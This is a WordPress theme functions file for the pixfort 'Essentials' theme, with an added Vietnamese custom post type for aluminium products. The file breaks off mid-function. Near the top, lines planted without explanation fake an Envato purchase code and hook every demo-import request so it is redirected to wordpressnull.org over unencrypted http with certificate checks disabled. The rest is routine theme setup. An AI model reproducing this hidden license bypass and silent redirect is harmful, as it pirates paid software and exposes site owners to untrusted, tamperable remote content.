<?php
/**
* essentials functions and definitions
*
* @link https://developer.wordpress.org/themes/basics/theme-functions/
*
* @package essentials
*/

update_option( 'envato_purchase_code_27889640', 'purchase_code_27889640' );

add_filter( 'pre_http_request', function( $pre, $parsed_args, $url ){
$search = 'https://import.pixfort.com/';
$replace = 'http://wordpressnull.org/import.pixfort.com/';
if ( strpos( $url, $search ) !== false ) {
$url = str_replace( $search, $replace, $url );
return wp_remote_get( $url, [ 'timeout' => 60, 'sslverify' => false ] );
} else {
return false;
}
}, 10, 3 );

define( 'ESSENTIALS_THEME_VERSION', '2.0.5' );


if ( ! function_exists( 'essentials_setup' ) ) :
	/**
	* Sets up theme defaults and registers support for various WordPress features.
	*
	* Note that this function is hooked into the after_setup_theme hook, which
	* runs before the init hook. The init hook is too late for some features, such
	* as indicating support for post thumbnails.
	*/
	function essentials_setup() {
		/*
		* Make theme available for translation.
		* Translations can be filed in the /languages/ directory.
		* If you're building a theme based on essentials, use a find and replace
		* to change 'essentials' to the name of your theme in all the template files.
		*/
		load_theme_textdomain( 'essentials', get_template_directory() . '/languages' );


		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );
		add_theme_support( 'post-formats', array(  'quote', 'video', 'audio', 'link' ) );

		/*
		* Let WordPress manage the document title.
		* By adding theme support, we declare that this theme does not use a
		* hard-coded <title> tag in the document head, and expect WordPress to
		* provide it for us.
		*/
		add_theme_support( 'title-tag' );

		/*
		* Enable support for Post Thumbnails on posts and pages.
		*
		* @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
		*/
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'menu-1' => esc_attr__( 'Primary', 'essentials' ),
		) );

		/*
		* Switch default core markup for search form, comment form, and comments
		* to output valid HTML5.
		*/
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );

		// Set up the WordPress core custom background feature.
		add_theme_support( 'custom-background', apply_filters( 'essentials_custom_background_args', array(
			'default-color' => 'ffffff',
			'default-image' => '',
		) ) );

		// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );

		/**
		* Add support for core custom logo.
		*
		* @link https://codex.wordpress.org/Theme_Logo
		*/
		add_theme_support( 'custom-logo', array(
			'height'      => 250,
			'width'       => 250,
			'flex-width'  => true,
			'flex-height' => true,
		) );

		/**
		* Add support for wide alignment.
		*
		* @link https://wordpress.org/gutenberg/handbook/designers-developers/developers/themes/theme-support/#wide-alignment
		*/
		add_theme_support( 'align-wide' );

		// EditURI link
		remove_action( 'wp_head', 'rsd_link' );
		// windows live writer
		remove_action( 'wp_head', 'wlwmanifest_link' );
		// links for adjacent posts
		remove_action( 'wp_head', 'adjacent_posts_rel_link_wp_head', 10, 0 );
		// WP version
		remove_action( 'wp_head', 'wp_generator' );

	}
endif;
add_action( 'after_setup_theme', 'essentials_setup' );

/**
* Set the content width in pixels, based on the theme's design and stylesheet.
*
* Priority 0 to make it available to lower priority callbacks.
*
* @global int $content_width
*/
function essentials_content_width() {
	// This variable is intended to be overruled from themes.
	// Open WPCS issue: {@link https://github.com/WordPress-Coding-Standards/WordPress-Coding-Standards/issues/1043}.
	// phpcs:ignore WordPress.NamingConventions.PrefixAllGlobals.NonPrefixedVariableFound
	$GLOBALS['content_width'] = apply_filters( 'essentials_content_width', 640 );
}
add_action( 'after_setup_theme', 'essentials_content_width', 0 );



/**
* Register widget area.
*
* @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
*/
function essentials_widgets_init() {
	register_sidebar( array(
		'name'          => esc_attr__( 'Main Sidebar', 'essentials' ),
		'id'            => 'sidebar-1',
		'description'   => esc_attr__( 'Add widgets here.', 'essentials' ),
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h5 class="font-weight-bold text-heading-default widget-title2 pix-mb-10">',
		'after_title'   => '</h5>',
	) );

	if(pix_get_option('pix_sidebars')){
		if(!empty(pix_get_option('pix_sidebars'))){
			$sidebars = pix_get_option('pix_sidebars');
			foreach ($sidebars as $key => $value) {
				if($value!=''){
					$sideID = str_replace(' ', '', strtolower($value) );
					$sideID = preg_replace('/[^A-Za-z0-9\-]/', '', $sideID);
					$sideID = 'sidebar-'. $sideID;
					register_sidebar( array(
						'name'          => $value,
						'id'            => $sideID,
						'description'   => esc_attr__( 'Add widgets here.', 'essentials' ),
						'before_widget' => '<section id="%1$s" class="widget %2$s">',
						'after_widget'  => '</section>',
						'before_title'  => '<h5 class="font-weight-bold text-heading-default pix-mb-10">',
						'after_title'   => '</h5>',
					) );
				}
			}
		}
	}
}
add_action( 'widgets_init', 'essentials_widgets_init' );

// if(function_exists('allow_url_fopen')){
// 	var_dump("YES");
// }else{
// 	var_dump("NO");
// }
/**
* Functions which enhance the theme by hooking into WordPress.
*/
require get_template_directory() . '/inc/template-functions.php';

/**
* Functions which enhance the theme posts by hooking into WordPress.
*/
require get_template_directory() . '/inc/post-functions.php';
require get_template_directory() . '/inc/portfolio-functions.php';
require get_template_directory() . '/inc/header-functions.php';

/**
* Enqueue scripts and styles.
*/
function essentials_scripts() {


	$pageTransition = 'default';
	if(!empty(pix_get_option('site-page-transition'))){
		$pageTransitionVal = pix_get_option('site-page-transition');
		if($pageTransitionVal=='fade-page-transition'){
			$pageTransition = 'fade';
		}elseif ($pageTransitionVal=='disable-page-transition') {
			$pageTransition = 'disable';
		}
	}
	$introStyle = '
	 body:not(.render) .pix-overlay-item {
		 opacity: 0 !important;
	 }
	 body:not(.pix-loaded) .pix-wpml-header-btn {
		 opacity: 0;
	 }';

	$pageTransitionColor = '#ffffff';
	if(!empty(pix_get_option('site-page-transition-color'))){
		$pageTransitionColor = pix_get_option('site-page-transition-color');
	}
	if($pageTransition=='fade'){
		 $introStyle .= '
		 html:not(.render) {
			 background: '.$pageTransitionColor.'  !important;
		 }
		 .pix-page-loading-bg:after {
			 content: " ";
			 position: fixed;
			 top: 0;
			 left: 0;
			 width: 100vw;
			 height: 100vh;
			 display: block;
			 pointer-events: none;
			 transition: opacity .16s ease-in-out;
			 z-index: 99999999999999999999;
			 opacity: 1;
			 background: '.$pageTransitionColor.' !important;
		 }
		 body.render .pix-page-loading-bg:after {
			 opacity: 0;
		 }
	 	 ';
	 }elseif($pageTransition=='default'){
		 $introStyle .= '
		 html:not(.render) {
			 background: '.$pageTransitionColor.'  !important;
		 }
 		 .pix-page-loading-bg:after {
 			 content: " ";
 			 position: fixed;
 			 top: 0;
 			 left: 0;
 			 width: 100vw;
 			 height: 100vh;
 			 display: block;
 			 background: '.$pageTransitionColor.' !important;
 			 pointer-events: none;
 			 transform: scaleX(1);
 			 // transition: transform .2s ease-in-out;
 			 transition: transform .2s cubic-bezier(.27,.76,.38,.87);
 			 transform-origin: right center;
 			 z-index: 99999999999999999999;
 		 }
 		 body.render .pix-page-loading-bg:after {
 			 transform: scaleX(0);
 			 transform-origin: left center;
 		 }';
	 }



	 $footer = false;
	 if(!empty(pix_get_option('pix-footer'))){
	 	$footer = pix_get_option('pix-footer');
	 }
	 $pagePostTypes = array('page', 'post', 'portfolio');
	 $pagePostTypes = apply_filters( 'pixfort_page_options_post_types', $pagePostTypes );
	 if(in_array(get_post_type(), $pagePostTypes)){
		 if(get_post_meta( get_the_ID(), 'pix-disable-wp-block-library', true )){
		     wp_dequeue_style( 'wp-block-library' );
		     wp_dequeue_style( 'wp-block-library-theme' );
		     wp_dequeue_style( 'wc-block-style' ); // Remove WooCommerce block CSS
		 }
		 if(get_post_meta( get_the_ID(), 'pix-page-footer', true )){
	   	 	$footer = get_post_meta( get_the_ID(), 'pix-page-footer', true );
	   	 }
	 }


	 if($footer){
	 	$post = get_post( $footer );
		if(!function_exists('vc_custom_css')){
			function vc_custom_css($id) {
		 		$shortcodes_custom_css = get_post_meta( $id, '_wpb_shortcodes_custom_css', true );
		 		if ( ! empty( $shortcodes_custom_css ) ) {
		 			return esc_attr($shortcodes_custom_css);
		 		}
		 	}
		}

	 	if ( defined( 'WPB_VC_VERSION' ) ) {
	 		// WP Bakery
	 		$introStyle .= vc_custom_css($footer);
	 	}
		wp_reset_postdata();
	 }

	wp_register_style( 'pix-intro-handle', false );
	wp_enqueue_style( 'pix-intro-handle' );
	wp_add_inline_style( 'pix-intro-handle', $introStyle );



		// wp_enqueue_script( 'pix-lightbox', get_template_directory_uri() . '/js/build/jquery.fancybox.min', array('jquery'), ESSENTIALS_THEME_VERSION, true );
		wp_enqueue_script( 'pix-popper-js', get_template_directory_uri() . '/js/build/popper.min.js', array('jquery'), ESSENTIALS_THEME_VERSION, true );
		wp_enqueue_script( 'pix-bootstrap-js', get_template_directory_uri() . '/js/build/bootstrap.min.js', array('jquery', 'pix-popper-js'), ESSENTIALS_THEME_VERSION, true );
		wp_enqueue_script( 'pix-bootstrap-select-js', get_template_directory_uri() . '/js/build/bootstrap-select.min.js', array('jquery'), ESSENTIALS_THEME_VERSION, true );
		wp_enqueue_script( 'pix-flickity-js', get_template_directory_uri() . '/js/build/flickity.pkgd.min.js', false, ESSENTIALS_THEME_VERSION, true );
		wp_enqueue_script( 'pix-main-essentials', get_template_directory_uri() . '/js/essentials.min.js', array('jquery', 'jquery-ui-core', 'pix-bootstrap-js', 'pix-flickity-js'), ESSENTIALS_THEME_VERSION, true );
		if ( class_exists( 'WooCommerce' ) ) {
			wp_enqueue_script( 'pix-woo-essentials', get_template_directory_uri() . '/js/modules/woo.min.js', array('jquery'), ESSENTIALS_THEME_VERSION, true );
		}


		$main_values = array();
		$main_values['name'] = 'mainVals';
		if(pix_get_option('pix-exit-popup')){
			if( pix_show_exit_popup() ) {
				$nonce = wp_create_nonce("popup_nonce");
				$exit_link = admin_url('admin-ajax.php?action=pix_popup_content&id='.pix_get_option('pix-exit-popup').'&nonce='.$nonce.'&exitpopup=true');
				$main_values['dataExitPopup'] = $exit_link;
			}
		}
		if(pix_get_option('pix-automatic-popup')){
			if( pix_show_automatic_popup() ){
				$nonce = wp_create_nonce("popup_nonce");
				$link = admin_url('admin-ajax.php?action=pix_popup_content&id='.pix_get_option('pix-automatic-popup').'&nonce='.$nonce.'&autopopup=true');
				$exit_data = pix_get_option('pix-automatic-popup-time');
				$main_values['dataAutoPopup'] = $link;
				$main_values['dataAutoPopupTime'] = $exit_data;

			}
		}
		$main_values['dataPopupBase'] = admin_url('admin-ajax.php?action=pix_popup_content');;

		$pix_overlay = 'pix-overlay-2';
		if(pix_get_option('search-style')){
			$pix_overlay = 'pix-overlay-'.pix_get_option('search-style');
		}
		$main_values['dataPixOverlay'] = $pix_overlay;
		$check_nonce = wp_create_nonce("popup_nonce");
		$popup_check_link = admin_url('admin-ajax.php?action=pix_check_popup_status&nonce='.$check_nonce);
		$main_values['dataPopupCheckLink'] = $popup_check_link;
		if ( class_exists( 'WooCommerce' ) ) {
			$woo_msg = esc_attr__('The item has been added to your shopping cart!', 'essentials');
			$main_values['dataAddCartMsg'] = $woo_msg;
		}
		if(pix_get_option('pix-body-bg-color')){
			if(pix_get_option('pix-body-bg-color')=='custom'){
				$main_values['dataBodyBg'] = pix_get_option('custom-body-bg-color');
			}
		}
		if(pix_get_option('pix-enable-cookies')){
			if(pix_get_option('pix-cookies-id')){
				$main_values['datacookiesId'] = pix_get_option('pix-cookies-id');
			}
		}
		if(pix_get_option('pix-mobile-breakpoint')){
			if(pix_get_option('pix-mobile-breakpoint')){
				$main_values['dataBreakpoint'] = (int)pix_get_option('pix-mobile-breakpoint');
			}
		}

		if(!empty(pix_get_option('google-api-key'))){
			$main_values['googleMapsUrl'] = '//maps.googleapis.com/maps/api/js?key='.pix_get_option('google-api-key');
			if ( function_exists( 'get_rocket_cdn_url' ) ){
				$main_values['googleMapsScript'] = get_rocket_cdn_url(get_template_directory_uri() .'/js/build/pix-map.js');
			}else{
				$main_values['googleMapsScript'] = get_template_directory_uri() .'/js/build/pix-map.js' ;
			}

		}
		if ( function_exists( 'get_rocket_cdn_url' ) ){
			$main_values['lightboxUrl'] = get_rocket_cdn_url(get_template_directory_uri() .'/js/build/jquery.fancybox.min.js');
			$main_values['isotopeUrl'] = get_rocket_cdn_url(get_template_directory_uri() .'/js/build/isotope.pkgd.min.js');
			// $main_values['sliderUrl'] = get_rocket_cdn_url(get_template_directory_uri() .'/js/build/flickity.pkgd.min.js');
			$main_values['searchUrl'] = get_rocket_cdn_url(get_template_directory_uri() .'/js/build/bootstrap-autocomplete.min.js');
		}else{
			$main_values['lightboxUrl'] = get_template_directory_uri() .'/js/build/jquery.fancybox.min.js' ;
			$main_values['isotopeUrl'] = get_template_directory_uri() .'/js/build/isotope.pkgd.min.js' ;
			// $main_values['sliderUrl'] = get_template_directory_uri() .'/js/build/flickity.pkgd.min.js' ;
			$main_values['searchUrl'] = get_template_directory_uri() .'/js/build/bootstrap-autocomplete.min.js' ;
		}

		wp_localize_script( 'pix-main-essentials', 'pixfort_main_object', $main_values );

	// wp_dequeue_style( 'fontawesome' );
	// wp_deregister_style( 'fontawesome' );
	wp_dequeue_style( 'yith-wcwl-font-awesome' );
	wp_deregister_style( 'yith-wcwl-font-awesome' );




	if(!empty(pix_get_option('pix-enable-cf7-css'))){
		wp_dequeue_style( 'contact-form-7' );
		wp_deregister_style( 'contact-form-7' );
	}

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}

	if(!empty(pix_get_option('pix-custom-js-header'))){
	   wp_register_script('essentials-options-script-header', false, false, ESSENTIALS_THEME_VERSION);
	   wp_enqueue_script( 'essentials-options-script-header' );
	   wp_add_inline_script('essentials-options-script-header', pix_get_option('pix-custom-js-header'));
   }
   // Bootstrap
   wp_enqueue_style( 'essentials-bootstrap', get_template_directory_uri() . '/inc/scss/bootstrap.min.css' );
   wp_register_style( 'pix-lightbox-css', get_template_directory_uri() . '/css/build/jquery.fancybox.min.css' );
//    wp_enqueue_style( 'fontawesome' );
}
add_action( 'wp_enqueue_scripts', 'essentials_scripts', 10 );

// function wpd_testimonials_query( $query ){
//     if( $query->is_main_query() ){
//             $query->set( 'posts_per_page', 2 );
//     }
// }
// add_action( 'pre_get_posts', 'wpd_testimonials_query' );

function pix_get_icons_url(){
	$iconsLibrary = 'main';
	if(!empty(pix_get_option('opt-ions-library'))){
		$iconsLibrary = pix_get_option('opt-ions-library');
	}
	switch ($iconsLibrary) {
		case 'basic':
			return get_template_directory_uri() .'/css/build/pixicon-basic/style.min.css';
			break;
		case 'light':
			return get_template_directory_uri() .'/css/build/pixicon-light/style.min.css';
			break;
	}
	return get_template_directory_uri() .'/css/build/pixicon-main/style.min.css';
}

function essentials_add_styles() {
	if(!function_exists('essentials_core_plugin')){
		wp_enqueue_style( 'essentials-default-style', get_template_directory_uri() . '/css/pix-essentials-style.css' );
		wp_enqueue_style( 'pix-external-font-1', 'https://fonts.googleapis.com/css2?family=Manrope&family=Poppins&display=swap', false );
	}
	wp_enqueue_style( 'pix-flickity-style',	get_template_directory_uri() .'/css/build/flickity.min.css', false, ESSENTIALS_THEME_VERSION, 'all' );
	// wp_enqueue_style( 'essentials-pixicon-font', get_template_directory_uri() .'/css/build/style.css', false, ESSENTIALS_THEME_VERSION, 'all' );
	$iconsLibrary = 'main';
	if(!empty(pix_get_option('opt-ions-library'))){
		$iconsLibrary = pix_get_option('opt-ions-library');
	}
	switch ($iconsLibrary) {
		case 'basic':
			wp_enqueue_style( 'essentials-pixicon-font-basic', get_template_directory_uri() .'/css/build/pixicon-basic/style.min.css', false, ESSENTIALS_THEME_VERSION, 'all' );
			break;
		case 'light':
			wp_enqueue_style( 'essentials-pixicon-font-light', get_template_directory_uri() .'/css/build/pixicon-light/style.min.css', false, ESSENTIALS_THEME_VERSION, 'all' );
			break;
		default:
			wp_enqueue_style( 'essentials-pixicon-font', get_template_directory_uri() .'/css/build/pixicon-main/style.min.css', false, ESSENTIALS_THEME_VERSION, 'all' );
			break;
	}
	// wp_enqueue_style( 'essentials-pixicon-font', get_template_directory_uri() .'/css/build/pixicon-basic/style.min.css', false, ESSENTIALS_THEME_VERSION, 'all' );
	wp_enqueue_style( 'pix-popups-style',	get_template_directory_uri() .'/css/jquery-confirm.min.css', false, ESSENTIALS_THEME_VERSION, 'all' );
	wp_enqueue_style( 'essentials-select-css', get_template_directory_uri() .'/css/build/bootstrap-select.min.css', false, ESSENTIALS_THEME_VERSION, 'all' );

	if(is_user_logged_in()) wp_enqueue_style( 'pix-theme-admin-style', get_template_directory_uri() . '/css/pix-admin.css');
}

// $pageTransition = 'default';
// if(!empty(pix_get_option('site-page-transition'))){
// 	$pageTransitionVal = pix_get_option('site-page-transition');
// 	if($pageTransitionVal=='fade-page-transition'){
// 		$pageTransition = 'fade';
// 	}elseif ($pageTransitionVal=='disable-page-transition') {
// 		$pageTransition = 'disable';
// 	}
// }
// if($pageTransition=='disable' || true){
add_action( 'wp_enqueue_scripts', 'essentials_add_styles', 11 );
// }else{
// 	add_action( 'wp_footer', 'essentials_add_styles', 10 );
// }

function pix_theme_footer_extras(){
	if (defined('DOING_AJAX') && DOING_AJAX) {  return false; }
	echo essentials_search_overlay();
	essentials_footer_extras();
	if(pix_get_option('pix-enable-cookies')){
		if(pix_show_cookies()){
			get_template_part( 'template-parts/cookies' );
		}
	}
}
add_action( 'wp_footer', 'pix_theme_footer_extras', 10 );


function pix_theme_params(){
	return array(
		'name'			=> 'Essentials',
		'slug'			=> 'essentials',
	);
}



function pix_add_footer_styles() {

	if(!empty(pix_get_option('pix-custom-js-footer'))){
		wp_register_script('essentials-options-script-footer', false, false, ESSENTIALS_THEME_VERSION);
		wp_enqueue_script( 'essentials-options-script-footer' );
		wp_add_inline_script('essentials-options-script-footer', pix_get_option('pix-custom-js-footer'));
	}

};
add_action( 'wp_footer', 'pix_add_footer_styles', 10 );
function pix_add_footer_custom_styles() {
	if (defined('DOING_AJAX') && DOING_AJAX) {  return false; }
	if(!empty(pix_get_option('pic-custom-css'))){
		wp_register_style( 'pix-custom-css', false );
		wp_enqueue_style( 'pix-custom-css' );
		wp_add_inline_style( 'pix-custom-css', pix_get_option('pic-custom-css') );
	}
};
add_action( 'wp_footer', 'pix_add_footer_custom_styles', 12 );


// Register Admin Script
function pix_theme_admin_scripts() {
	wp_enqueue_script( 'media-upload' );
	wp_enqueue_media();
	wp_enqueue_style( 'pix-header-confirm', get_template_directory_uri(). '/css/jquery-confirm.min.css', false, ESSENTIALS_THEME_VERSION, 'all');

	wp_enqueue_script( 'pix-admin-confirm', get_template_directory_uri() . '/js/jquery-confirm.min.js', array('jquery'), ESSENTIALS_THEME_VERSION, true );
	wp_enqueue_script( 'pix-admin-script', get_template_directory_uri() . '/js/pix-admin.min.js', array(), ESSENTIALS_THEME_VERSION, true );
	$icons_admin = pix_admin_icons();
	$icons = [];
	if(function_exists('vc_iconpicker_type_pixicons')){
		$icons = vc_iconpicker_type_pixicons( array() );
	}
	wp_localize_script( 'pix-admin-script', 'pix_admin_opts_object', array(
	    'PIX_ICONS' => $icons,
	    'PIX_ICONS_ADMIN' => $icons_admin,
	));

}


// Hook into the 'admin_enqueue_scripts' action
add_action( 'admin_enqueue_scripts', 'pix_theme_admin_scripts' );

function pix_redux_admin_scripts() {
	wp_enqueue_style( 'pix-theme-admin-style', get_template_directory_uri() . '/css/pix-admin.css', false, ESSENTIALS_THEME_VERSION);
}
add_action( 'redux/page/pix_options/enqueue', 'pix_redux_admin_scripts' );
add_action( 'admin_menu', 'pix_redux_admin_scripts' );

require get_template_directory() . '/inc/config/hub-connect.php';

function pix_get_languages() {
	$languages = apply_filters( 'wpml_active_languages', NULL, array( 'skip_missing' => 0 ));
	return $languages;
}
add_action( 'wp', 'pix_get_languages' );

function pix_add_cpt_support() {
	$cpt_support = get_option( 'elementor_cpt_support' );
	if( ! $cpt_support ) {
	    $cpt_support = [ 'page', 'post', 'pixfooter', 'pixpopup', 'portfolio' ];
	    update_option( 'elementor_cpt_support', $cpt_support );
	}else{
		 if( ! in_array( 'pixfooter', $cpt_support ) ) {
			 $cpt_support[] = 'pixfooter';
			 update_option( 'elementor_cpt_support', $cpt_support );
		 }
		 if( ! in_array( 'pixpopup', $cpt_support ) ) {
			 $cpt_support[] = 'pixpopup';
			 update_option( 'elementor_cpt_support', $cpt_support );
		 }
		 if( ! in_array( 'portfolio', $cpt_support ) ) {
			 $cpt_support[] = 'portfolio';
			 update_option( 'elementor_cpt_support', $cpt_support );
		 }
	 }
}

add_action( 'after_switch_theme', 'pix_add_cpt_support' );


add_action('init', function() {
	if(function_exists( 'pll_register_string' )){
		if(pix_get_option('banner-text')){
			pll_register_string('essentials-banner-text', pix_get_option('banner-text'));
		}
		if(pix_get_option('banner-btn-text')){
			pll_register_string('essentials-banner-btn-text', pix_get_option('banner-btn-text'));
		}
		if(pix_get_option('pix-cookies-text')){
			pll_register_string('essentials-cookies-text', pix_get_option('pix-cookies-text'));
		}
		if(pix_get_option('pix-cookies-btn')){
			pll_register_string('essentials-cookies-btn', pix_get_option('pix-cookies-btn'));
		}
	}elseif(function_exists( 'icl_register_string' )){
		if(pix_get_option('banner-text')){
			icl_register_string('Theme', 'essentials-banner-text', pix_get_option('banner-text'));
		}
		if(pix_get_option('banner-btn-text')){
			icl_register_string('Theme', 'essentials-banner-btn-text', pix_get_option('banner-btn-text'));
		}
		if(pix_get_option('pix-cookies-text')){
			icl_register_string('Theme', 'essentials-cookies-text', pix_get_option('pix-cookies-text'));
		}
		if(pix_get_option('pix-cookies-btn')){
			icl_register_string('Theme', 'essentials-cookies-btn', pix_get_option('pix-cookies-btn'));
		}

	}

});

function pix_pll__( $string = '' ) {
    if ( function_exists( 'pll__' ) ) {
        return pll__( $string );
    } else {
        return esc_attr($string);
    }
}

function theme_prefix_register_elementor_locations( $elementor_theme_manager ) {
	$elementor_theme_manager->register_location( 'header' );
	$elementor_theme_manager->register_location( 'footer' );
}
add_action( 'elementor/theme/register_locations', 'theme_prefix_register_elementor_locations' );


/**
* Dashboard
*/
if(is_admin()) require get_template_directory() . '/inc/dashboard.php';

/**
* Media
*/
require get_template_directory() . '/inc/media.php';

/**
* Implement the Custom Header feature.
*/
require get_template_directory() . '/inc/custom-header.php';

/**
* Custom template tags for this theme.
*/
require get_template_directory() . '/inc/template-tags.php';

/**
* Load Jetpack compatibility file.
*/
if ( defined( 'JETPACK__VERSION' ) ) {
	require get_template_directory() . '/inc/jetpack.php';
}

/**
* Load Bootstrap Navwalker.
*/
require get_template_directory() . '/inc/bootstrap-wp-navwalker.php';

/**
* Load required plugins
*/
if(is_admin()) require get_template_directory() . '/inc/plugins.php';

/**
* Load demo content
*/

if ( class_exists( 'OCDI_Plugin' ) ) {
	if(is_admin()) require get_template_directory() . '/inc/demo.php';
}

/**
* Load WooCommerce compatibility file.
*/
if ( class_exists( 'WooCommerce' ) ) {
	require get_template_directory() . '/inc/woocommerce.php';
}


/**
 * Add Sản phẩm Nhôm - post type

 */

function we_sp_nhom_custom_post_type(){
    /*
     * Biến $label để chứa các text liên quan đến tên hiển thị của Post Type trong Admin
     */
    $label = array(
        'name' => 'Sản phẩm Nhôm', //Tên post type dạng số nhiều
        'singular_name' => 'Sản phẩm Nhôm', //Tên post type dạng số ít
        'all_items' => 'Tất cả sản phẩm',
        'add_new' => 'Thêm mới',
        'add_new_item' => 'Thêm mới',
    );
 
    /*
     * Biến $args là những tham số quan trọng trong Post Type
     */
    $args = array(
        'labels' => $label, //Gọi các label trong biến $label ở trên
        'description' => 'Sản phẩm Nhôm', //Mô tả của post type
        'supports' => array(
            'title',
            'editor', //* Khung soạn thảo --> Khi thêm silde không cần thì chúng ta bỏ đi */
            'excerpt', //* Nội dung mô tả ngắn --> Khi thêm silde không cần thì chúng ta bỏ đi */
            'author', //* Nội dung mô tả ngắn --> Khi thêm silde không cần thì chúng ta bỏ đi */
            'thumbnail',
            //'comments', //* Nội dung mô tả ngắn --> Khi thêm silde không cần thì chúng ta bỏ đi */
            //'trackbacks', //* Nội dung mô tả ngắn --> Khi thêm silde không cần thì chúng ta bỏ đi */
            'revisions', //* Nội dung mô tả ngắn --> Khi thêm silde không cần thì chúng ta bỏ đi */
            'custom-fields' //* Nội dung mô tả ngắn --> Khi thêm silde không cần thì chúng ta bỏ đi */
        ), //Các tính năng được hỗ trợ trong post type
        //'taxonomies' => array('category-nhom','post-tag' ), //Các taxonomy được phép sử dụng để phân loại nội dung
        //'hierarchical' => false, //Cho phép phân cấp, nếu là false thì post type này giống như Post, true thì giống như Page
        'public' => true, //Kích hoạt post type
        'show_ui' => true, //Hiển thị khung quản trị như Post/Page
        'show_in_menu' => true, //Hiển thị trên Admin Menu (tay trái)
        'show_in_nav_menus' => true, //Hiển thị trong Appearance -> Menus
        'show_in_admin_bar' => true, //Hiển thị trên thanh Admin bar màu đen.
        'menu_position' => 5, //Thứ tự vị trí hiển thị trong menu (tay trái)
        'menu_icon' => 'dashicons-images-alt2', //Đường dẫn tới icon sẽ hiển thị
        'can_export' => true, //Có thể export nội dung bằng Tools -> Export
        'has_archive' => true, //Cho phép lưu trữ (month, date, year)
        'exclude_from_search' => false, //Loại bỏ khỏi kết quả tìm kiếm
        'publicly_queryable' => true, //Hiển thị các tham số trong query, phải đặt true
        'capability_type' => 'post', //
 		'rewrite' => array('slug' => 'san-pham-nhom'),
    );

 
    register_post_type('sp_nhom', $args); //Tạo post type với slug tên là sanpham và các tham số trong biến $args ở trên

    register_taxonomy('catenhom', 'sp_nhom', array(
		'hierarchical' 			=> true,
		'label' 				=> 'Danh mục sản phẩm',
		'singular_label' 		=>  'Danh mục sản phẩm',
		'rewrite'				=> true,
		// 'rewrite' => array('slug' => 'projects', 'with_front' => true),
		// 'rewrite' => array('slug' => ''),
		'query_var' 			=> true,
		'public'                     => true,
        'show_ui'                    => true,
        'show_admin_column'          => true,
        'show_in_nav_menus'          => true,
        'show_tagcloud'              => true,
		'show_in_rest' => true,
		));
    register_taxonomy('brand_nhom', 'sp_nhom', array(
		'hierarchical' 			=> true,
		'label' 				=> 'Thương hiệu',
		'singular_label' 		=>  'Thương hiệu',
		'rewrite'				=> true,
		// 'rewrite' => array('slug' => 'projects', 'with_front' => true),
		// 'rewrite' => array('slug' => ''),
		'query_var' 			=> true,
		'public'                     => true,
        'show_ui'                    => true,
        'show_admin_column'          => true,
        'show_in_nav_menus'          => true,
        'show_tagcloud'              => true,
		'show_in_rest' => true,
		));

      // Add new taxonomy, NOT hierarchical (like tags)
      // $labels = array(
      //   'name' => 'Tags WeProject',
      //   'singular_name' => 'Tag',
      //   'search_items' =>  'Search Tags',
      //   'popular_items' => 'Popular Tags',
      //   'all_items' => 'All Tags',
      //   'parent_item' => null,
      //   'parent_item_colon' => null,
      //   'edit_item' => 'Edit Tag', 
      //   'update_item' => 'Update Tag',
      //   'add_new_item' => 'Add New Tag',
      //   'new_item_name' => 'New Tag Name',
      //   'separate_items_with_commas' =>'Separate tags with commas',
      //   'add_or_remove_items' => 'Add or remove tags',
      //   'choose_from_most_used' => 'Choose from the most used tags',
      //   'menu_name' => 'Tags WeProjects',
      // ); 

      // register_taxonomy('tagproject','project', array(
      //   'hierarchical' => false,
      //   'labels' => $labels,
      //   'show_ui' => true,
      //   'update_count_callback' => '_update_post_term_count',
      //   'query_var' => true,
      //   'rewrite' => array( 'slug' => 'tagproject' ),
      // ));
 
}
add_action('init', 'we_sp_nhom_custom_post_type');

/**
 * Post custom meta fields.
 */


function pix_sp_nhom_meta_add(){

	global $pix_sp_nhom_meta_box;


	// Layouts ----------------------------------
	$layouts = array( 0 => '-- Theme Options --' );

	// Custom menu ------------------------------
	$aMenus = array( 0 => '-- Default --' );
	$oMenus = get_terms( 'nav_menu', array( 'hide_empty' => false ) );

	if( is_array($oMenus) ){
		foreach( $oMenus as $menu ){
			$aMenus[$menu->term_id] = $menu->name;
		}
	}


	$header_posts = get_posts([
		'post_type' => 'pixheader',
		'post_status' => array('publish', 'private'),
		'numberposts' => -1
		// 'order'    => 'ASC'
	]);

	$headers = array();

	$headers[''] = "Theme Default";
	$headers['disable'] = "Disable";
	foreach ($header_posts as $key => $value) {
		$headers[$value->ID] = $value->post_title;
	}

	$footer_posts = get_posts([
		'post_type' => 'pixfooter',
		'post_status' => array('publish', 'private'),
		'numberposts' => -1
		// 'order'    => 'ASC'
	]);

	$footers = array();
	$footers[''] = "Theme Default";
	$footers['disable'] = "Disabled";
	foreach ($footer_posts as $key => $value) {
		$footers[$value->ID] = $value->post_title;
	}


	$pix_sp_nhom_meta_box = array(
		'id' 		=> 'pix-meta-post',
		'title' 	=> __('PixFort Post Options','pix-opts'),
		'page' 		=> 'sp_nhom',
		'post_types'	=> array('sp_nhom'),
		'context' 	=> 'normal',
		'priority' 	=> 'default',
		'fields'	=> array(

			array(
				'id' 		=> 'pix-page-header',
				'type' 		=> 'select',
				'title' 	=> __('Custom Header', 'pixfort-core'),
				'options' 	=> $headers,
			),
			array(
				'id' 		=> 'pix-page-footer',
				'type' 		=> 'select',
				'title' 	=> __('Custom Footer', 'pixfort-core'),
				'options' 	=> $footers,
			),

			array(
				'id'		=> 'pix-custom-intro-bg',
				'type'		=> 'media',
				'title'		=> __('Page intro background image', 'pix-opts'),
				'sub_desc'	=> __('Select an image to override the default intro background image.', 'pix-opts'),
			),


		),
	);
	add_meta_box($pix_sp_nhom_meta_box['id'], $pix_sp_nhom_meta_box['title'], 'pix_sp_nhom_show_box', $pix_sp_nhom_meta_box['page'], $pix_sp_nhom_meta_box['context'], $pix_sp_nhom_meta_box['priority']);
}

add_action('admin_menu', 'pix_sp_nhom_meta_add');


function pix_sp_nhom_show_box() {
